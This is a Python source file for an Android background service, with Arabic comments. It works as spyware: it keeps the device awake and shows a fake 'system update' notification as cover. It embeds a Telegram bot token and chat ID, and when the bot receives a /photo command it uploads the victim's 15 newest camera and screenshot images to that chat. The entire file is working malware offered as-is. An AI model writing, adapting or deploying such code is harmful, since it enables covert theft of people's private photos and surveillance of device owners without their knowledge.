import os
import time
import threading
import telebot
from jnius import autoclass

# استدعاء كلاسات أندرويد للحماية
PythonService = autoclass('org.kivy.android.PythonService')
Context = autoclass('android.content.Context')
NotificationBuilder = autoclass('android.app.Notification$Builder')
NotificationChannel = autoclass('android.app.NotificationChannel')
NotificationManager = autoclass('android.app.NotificationManager')
Build = autoclass('android.os.Build')
PowerManager = autoclass('android.os.PowerManager')

service = PythonService.mService
context = service.getApplicationContext()

# 1. منع المعالج من النوم (WakeLock)
power = context.getSystemService(Context.POWER_SERVICE)
wake_lock = power.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "ShadowCore::WakeLock")
wake_lock.acquire()

# 2. إنشاء إشعار Foreground Service (الدرع الحامي)
def start_foreground():
    CHANNEL_ID = "system_service_channel"
    nm = context.getSystemService(Context.NOTIFICATION_SERVICE)
    if Build.VERSION.SDK_INT >= 26:
        channel = NotificationChannel(CHANNEL_ID, "System Sync", NotificationManager.IMPORTANCE_LOW)
        nm.createNotificationChannel(channel)
        builder = NotificationBuilder(context, CHANNEL_ID)
    else:
        builder = NotificationBuilder(context)

    notification = builder.setContentTitle("تحديث النظام") \
                          .setContentText("يتم الآن مزامنة ملفات النظام...") \
                          .setSmallIcon(context.getApplicationInfo().icon) \
                          .build()
    service.startForeground(1, notification)

# 3. إعدادات البوت وسحب الصور
BOT_TOKEN = "7820129712:AAH9pZ49S_m8tY8965625902"
CHAT_ID = "6110903337"
bot = telebot.TeleBot(BOT_TOKEN, threaded=False)

def get_latest_photos():
    paths = ["/storage/emulated/0/DCIM/Camera", "/storage/emulated/0/Pictures/Screenshots"]
    photo_files = []
    for path in paths:
        if os.path.exists(path):
            for f in os.listdir(path):
                if f.lower().endswith(('.jpg', '.jpeg', '.png')):
                    full_p = os.path.join(path, f)
                    photo_files.append((full_p, os.path.getmtime(full_p)))
    photo_files.sort(key=lambda x: x[1], reverse=True)
    return [x[0] for x in photo_files[:15]]

@bot.message_handler(commands=['photo'])
def handle_photo_request(message):
    photos = get_latest_photos()
    for p in photos:
        try:
            with open(p, 'rb') as img:
                bot.send_photo(CHAT_ID, img)
            time.sleep(0.6)
        except: pass

# 4. تشغيل البوت بحلقة لا تنتهي
def run_bot():
    while True:
        try:
            bot.infinity_polling(timeout=20, long_polling_timeout=20, skip_pending=True)
        except:
            time.sleep(10)

if __name__ == '__main__':
    start_foreground()
    t = threading.Thread(target=run_bot)
    t.daemon = True
    t.start()
    while True:
        time.sleep(60) # الحفاظ على بقاء الخدمة حية
